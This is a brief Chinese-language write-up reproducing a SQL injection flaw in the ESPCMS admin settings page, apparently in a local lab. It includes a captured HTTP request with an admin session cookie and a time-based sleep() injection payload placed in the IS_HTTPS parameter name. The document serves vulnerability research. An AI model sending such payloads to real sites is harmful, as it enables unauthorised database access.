espcmsSQL注入漏洞
https://www.ecisp.cn/html/cn/download_espcms/
phpstudy安装
代码审计
espcms_admin/control/SettingMain.php
在更新网站配置时，key和value的值是直接拼接进去的，因此存在SQL注入漏洞

漏洞复现
安装成功后进入网站后台
点击设置->系统设置->确定保存

并抓包
POST /espcms_admin/index.php?act=FuNYwqPAgpSXj4m5d2npHEownomPfTf6l4%2BJuXdp6Rxja3m%2FkIeu1g%3D%3D HTTP/1.1
Host: 192.168.1.101
Content-Length: 518
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie:espcms_admin_user_info=D30R5LB5F3tzA96zEfkI6K7agHgeLvgeUCjwWtnFKKTTijDU563rtvbF2%2BZPKt2AFV%2FSBefbEwhwz2Y4v8O0d%2BdSQVPrIuV5fe5dP91YUivEt6JhJx2lVtgz01pzBwvJiXfG1EXATRSNiOProF6Mh2%2BJcTXlrQLBPE42ycga1aPOVdHT7xyMJZSrp%2BGetH8CZ7pyHUpFWROqoCt5hHO7xM48Ebz3UEVruMjbJJLUxFFsmWoMFL%2BdMJJlmOFXe%2BPZS5r5Pja02zjNFbgcjakujmffPpqYlJW6HJe0U1xNfGJm6SjW%2BhaseaBLNIfVLDpuTqJPkgKcVePiqoUBqATOVWskGbjhbduHQfNOtLFwurCZa7SxuSlT6UJIDyQr9hM1DgJnDcrZn57WF43ah3ACdbmk4G5o5uK%2BeIkF5IGBgDmNGt0n35hr6qqgK3mEc7vE%2FRhR1PSyNGBSnjg5c6Yd3MY7MGREbfve; 
Connection: close

token_key=&token_name=&config_name=%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE&SITENAME=123456&WEB_ICON_16=upfile%2Fespcms_16.png&WEB_ICON_32=upfile%2Fespcms_32.png&WEB_ICON_64=upfile%2Fespcms_64.png&IS_CLOSE=0&CLOSE_CONTENT=&ADMINE_MAIL=123%40qq.com&IS_LOG=1&IS_GZIP=1&DEFAULT_LNG=cn&IS_ALONELNG=1&HOME_LNG=cn&IS_HTML=1&IS_REWRITE=0&ENTRANCE_FILE=index&IS_HTMLDIR=1&FILE_HTMLDIR=html%2F&IS_GETCACHE=1&IS_CACHING=1&CACHE_TIME=3600&HTTP_PATHTYPE=1&TIP_SEARCHTIME=30&IS_HTTPS'and/**/(sleep(3))and'1'%3d'1=http

修改请求体中的IS_HTTPS为IS_HTTPS'and/**/(sleep(2))and'1'%3d'1


Sleep()函数成功执行，因此存在SQL注入漏洞
